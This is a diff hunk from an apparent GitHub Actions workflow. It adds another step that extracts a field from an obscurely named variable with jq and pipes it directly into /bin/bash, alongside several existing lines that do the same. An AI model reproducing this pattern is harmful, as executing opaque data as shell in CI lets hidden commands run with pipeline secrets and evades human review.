@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$mc610" | jq -r .dqzi0814 | /bin/bash
           echo $newq7 | jq -r .gh28 | /bin/bash
           printf '%s' "$mia93" | jq -r .xi64 | /bin/bash
+          printf '%s' "$ib800" | jq -r .c3347 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
